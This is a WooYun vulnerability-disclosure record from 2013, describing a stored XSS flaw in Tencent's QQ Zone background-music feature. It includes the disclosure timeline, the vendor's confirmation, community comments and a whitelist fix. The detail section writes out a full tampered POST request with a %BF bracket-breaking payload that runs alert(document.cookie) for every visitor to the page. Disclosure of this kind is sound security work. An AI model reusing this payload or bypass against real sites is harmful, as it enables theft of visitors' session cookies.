{"id": 7897, "wybug_id": "wooyun-2013-039965", "wybug_title": "QQ空间存储XSS", "wybug_corp": "腾讯", "wybug_author": "neobyte", "wybug_date": "2013-10-16 18:19", "wybug_open_date": "2013-11-30 18:20", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "类型应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-30：\t细节向公众公开  简要描述： QQ空间存储XSS,访问用户空间首页自动触发 详细说明：  QQ空间,添加背景音乐,选择\"添加网络背景音乐\",任意输入Url,姓名,歌曲名等信息拦截数据包,篡改url参数如下(两个xxx是当前用户qq号):\nPOST http://qzone-music.qq.com/fcg-bin/favnetsongtobgm.fcg?g_tk=1994248789 ......formsender=1&source=102&url=http%3A%2F%2F112233%BF'}]}}});alert(document.cookie)//.mp3&songtitle=112233&singer=112233&desc=&inCharset=gb2312&uin=xxx&hostUin=xxx&notice=0&needNewCode=0&g_tk=1994248789&format=fs&platform=musicbox&outCharset=gb2312\n然后其他用户访问该空间首页即触发XSS.分析:上述数据保存在服务器端后,通过一个JSONP加载,该JSONP的URL是http://qzone-music.qq.com/fcg-bin/cgi_playlist_xml.fcg?json=1&uin=xxx&g_tk=5381关于%BF, 请参考 WooYun: 腾讯一处存储型XSS - 有过滤？我绕绕绕！ ,不同的是这里是JSONP,所以无需<script>标签以及复杂的绕过方法,js即可!   漏洞证明：  \n\n   修复方案：  严格点,用白名单吧   版权声明：转载请注明来源 neobyte@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-16 18:55 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-16 18:22 |    \t\t浩森 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        )\t\t \n  详情。。    \n     2013-10-16 18:22 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  manrk    \n     2013-10-16 18:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我信洞主    \n     2013-10-16 18:43 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  耐心看后续    \n     2013-10-16 18:46 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  mark     \n     2013-10-16 18:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  第一次见20的    \n     2013-10-16 19:11 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @xsser 第一次见20的    \n     2013-10-16 20:01 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  mark    \n     2013-10-16 20:42 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  第一次见20    \n     2013-10-16 20:48 |    \t\t1ee \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:14        | 看书中....)\t\t \n  果断mark    \n     2013-10-16 21:58 |    \t\t艾特绅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 愿意为网络安全做出我的贡献)\t\t \n  第一次见20    \n     2013-10-16 22:39 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  进首页，自动触发    \n     2013-10-16 23:50 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @xsser 不是记得以前一个拿shell的就20么  你老了 记忆差了    \n     2013-10-17 00:04 |    \t\tneal \t\t\t( 普通白帽子  |\t\t\t        Rank:219 漏洞数:23        )\t\t \n  我擦，这么牛B的 你也发？      \n     2013-10-17 01:45 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  20rank，果断mark    \n     2013-10-17 08:37 |    \t\t戏子 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:3        | 两个人的生活)\t\t \n  20牛哦    \n     2013-10-17 10:36 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  很少看到tx给20    \n     2013-10-18 10:21 |    \t\tp0di \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 1+1 = 2 ？)\t\t \n  超越2哥？    \n     2013-10-22 14:09 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  长江后浪推前浪了，二哥快现身吧    \n     2013-11-05 20:59 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  碉堡了    \n     2013-11-12 18:13 |    \t\t纷纭 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:8        | 学习者。)\t\t \n  等待看20 的    \n     2013-11-16 08:27 |    \t\t丶潇洒哥 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 我是一枚农民工。)\t\t \n  20的，貌似很牛逼。    \n     2013-11-18 20:49 |    \t\t花生^_^ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 加强学习~~)\t\t \n  很少见TX给20！关注    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}